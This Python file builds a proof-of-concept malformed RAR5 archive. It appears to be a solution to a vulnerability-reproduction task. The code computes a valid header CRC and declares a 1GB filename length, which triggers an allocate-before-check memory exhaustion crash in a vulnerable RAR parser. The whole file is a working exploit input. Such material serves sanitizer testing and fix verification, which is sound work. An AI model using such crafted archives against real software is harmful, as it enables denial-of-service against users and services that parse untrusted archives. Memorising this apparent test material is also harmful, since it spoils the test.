import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability lies in the parsing of a RAR5 file header. The code
        reads a variable-length integer for the filename size, allocates memory
        for the name based on this size, and only then checks if the size is
        within acceptable limits.

        This PoC exploits this "allocate-before-check" flaw by providing a
        file header with a very large name length (e.g., 1GB). The vulnerable
        version will attempt to allocate this huge amount of memory, which will
        be flagged as an error (likely OOM) by sanitizers, causing a crash.
        The fixed version performs the check before allocation and will simply
        skip the oversized name, thus not crashing.

        The PoC consists of:
        1. The RAR5 magic signature.
        2. A single crafted File Header block that specifies the huge name length.
           The PoC does not need to contain the actual (huge) name data, as the
           allocation attempt itself is sufficient to trigger the vulnerability.
        """

        def to_vint(n: int) -> bytes:
            """Encodes an integer into the RAR5 VINT format."""
            res = bytearray()
            while n >= 0x80:
                res.append((n & 0x7f) | 0x80)
                n >>= 7
            res.append(n)
            return bytes(res)

        # RAR5 signature
        poc = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
        
        # A large size to trigger an excessive memory allocation error.
        # 1GB (0x40000000) is a common choice for such tests.
        NAME_LEN = 0x40000000

        # Construct a minimal but valid RAR5 File Header.
        # Header Type: 0x02 (File Header)
        head_type = to_vint(2)
        # Header Flags: 0x00 (no extra area or data)
        head_flags = to_vint(0)
        # File Flags: 0x00
        file_flags = to_vint(0)
        # Unpacked Size: 0
        unp_size = to_vint(0)
        # File Attributes: 0x20 (Windows FILE_ATTRIBUTE_ARCHIVE)
        file_attr = to_vint(0x20)
        # Compression Info: 0x30 (Store method)
        comp_info = to_vint(0x30)
        # Host OS: 0x02 (Windows)
        host_os = to_vint(2)
        # File Name Length: The huge value that triggers the bug.
        name_len_vint = to_vint(NAME_LEN)

        # The body of the header consists of all the fields after the header size.
        header_body = (
            head_type +
            head_flags +
            file_flags +
            unp_size +
            file_attr +
            comp_info +
            host_os +
            name_len_vint
        )

        # The size of the header body is also encoded as a VINT.
        header_size_vint = to_vint(len(header_body))

        # The CRC is calculated over the header size and the header body.
        header_content_for_crc = header_size_vint + header_body

        # Calculate the CRC32 and format it as 4 little-endian bytes.
        crc = zlib.crc32(header_content_for_crc)
        crc_bytes = crc.to_bytes(4, 'little')

        # Assemble the complete file header block.
        file_header = crc_bytes + header_content_for_crc

        # Append the malicious header to the signature to form the final PoC.
        poc += file_header
        
        return poc
